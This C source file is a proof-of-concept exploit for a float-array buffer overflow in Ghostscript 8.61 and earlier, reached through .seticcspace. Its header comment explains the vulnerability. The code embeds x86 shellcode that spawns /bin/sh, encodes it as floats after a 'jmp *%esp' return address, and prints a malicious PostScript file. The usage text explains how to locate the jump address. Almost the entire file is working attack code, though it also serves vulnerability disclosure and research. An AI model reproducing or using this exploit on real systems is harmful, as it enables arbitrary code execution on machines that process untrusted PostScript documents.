/* A proof of concept exploit for ghostscript 8.61 and earlier.
 *
 * Vulnerability discovered by Chris Evans <cevans@google.com>
 * Author: wad@google.com (Will Drewry)
 *
 * Affects: All versions of ghostscript that support .seticcspace.
 * Tested on: Ubuntu gs-esp-8.15.2.dfsg.0ubuntu1-0ubuntu1 (x86)
 *            Ghostscript 8.61 (2007-11-21) (x86)
 *
 * Discussion:
 *
 * The vulnerability is in the float vector handling in the seticcspace
 * function. zicc.c:seticcspace() allows the user to set the number of
 * expected float values (ncomps) in a vector (range_buff).  However,
 * this vector is statically allocated with the maximum space of 8
 * floats.  Despite this, the call (dict_floats_array_check_param) to
 * populate the array of floats is passed a maximum size of ncomps*2.  A
 * large payload will result in overflowing this array.  Since all the
 * values are read in as single precision floating point values, the
 * payload must be encoded as floats.
 *
 * This exploit encodes a basic metasploit-generated exec(/bin/sh) chunk
 * of shellcode as a list of floats and prepends the address to a "jmp
 * *%esp" in the /usr/bin/gs.
 *
 * This was tested on gs-esp-8.15.2.dfsg.0ubuntu1-0ubuntu1 package in
 * Ubuntu (on a 32-bit-only kernel)  and versions up to 8.61
 * (2007-11-21) on other distributions.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned char shellcode[] =
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00"
"\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69"
"\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
unsigned char sledpad[] = "\x90\x90\x90"; // maximum sledpad needed
unsigned char spacepad[] = "\x41\x41\x41\x41"; // indicator for fun dumps

float bytes_to_float(unsigned char *bytes) {
  float f = 0.0f;
  memcpy((void *)&f, bytes, sizeof(float));
  return f;
}

unsigned char *build_attack(size_t *attack_size, long a, int padding) {
  size_t float_size = sizeof(float);
  size_t shellcode_size = sizeof(shellcode) - 1;
  size_t sledpad_size = float_size - (shellcode_size % float_size);
  size_t pad_size = padding * (sizeof(spacepad) - 1);
  unsigned char *attack = NULL, *padded_shellcode = shellcode;
  int i,j;

  // allocate attack space
  *attack_size = shellcode_size + sledpad_size + sizeof(a) + pad_size;
  if (*attack_size) attack = malloc(*attack_size);
  if (attack == NULL) exit(1);

  fprintf(stderr, "sizeof(float) = %d\n", float_size);
  fprintf(stderr, "sledpad_size = %d\n", sledpad_size);
  fprintf(stderr, "pad_size = %d\n", pad_size);
  fprintf(stderr, "attack_size = %d\n", *attack_size);
  fprintf(stderr, "address = %p\n", a);

  // write out request space padding
  for (i = 0; i < pad_size; i += sizeof(spacepad)-1)
    memcpy(&attack[i], spacepad, sizeof(spacepad)-1);

  // write out the address to a "jmp *%esp"
  memcpy(&attack[i], (void *)&a, sizeof(long));
  i += sizeof(long);

  // pad to ensure that shellcode is divisible by sizeof(float)
  if (sledpad_size != float_size){
    // build a padded a shellcode
    padded_shellcode = malloc(shellcode_size+sledpad_size);
    if (padded_shellcode == NULL) exit(1);
    memcpy(padded_shellcode, sledpad, sledpad_size);
    memcpy(padded_shellcode+sledpad_size, shellcode, shellcode_size);
    shellcode_size += sledpad_size;
  }

  // Copy in the padded shellcode
  memcpy(&attack[i], padded_shellcode, shellcode_size);

  if (shellcode != padded_shellcode) free(padded_shellcode);
  // That's it.
  return attack;
}

int main(int argc, char **argv) {
  size_t i = 0;
  size_t attack_size = 0;
  unsigned char *attack = NULL;
  // location of jmp *esp in the binary
  long address = 0x0;


  if (argc != 3){
    fprintf(stderr, "Usage: %s <pad count> <addr of jmp *%%esp>\n", argv[0]);
    fprintf(stderr, "       e.g. %s 15 $((0x8744eff))\n", argv[0]);
    fprintf(stderr, "An address can be acquired with:\n");
    fprintf(stderr, "  objdump -D /usr/bin/gs | grep 'jmp[ \\t]\\+\\*%%esp'\n");
    return 1;
  }

  attack = build_attack(&attack_size, atol(argv[2]), atoi(argv[1]));

  // output the bad PS
  printf(
    "%!PS-Adobe-2.0\n\n"
    "<< /DataSource currentfile /N 100 /Range [ ");
  // convert the attack to floats
  for(i = 0; i <= attack_size - sizeof(float); i += sizeof(float))
    printf("%.9g ",  bytes_to_float(attack+i));
  printf(" ]  >> .seticcspace\n");

  free(attack);
  return 0;
}
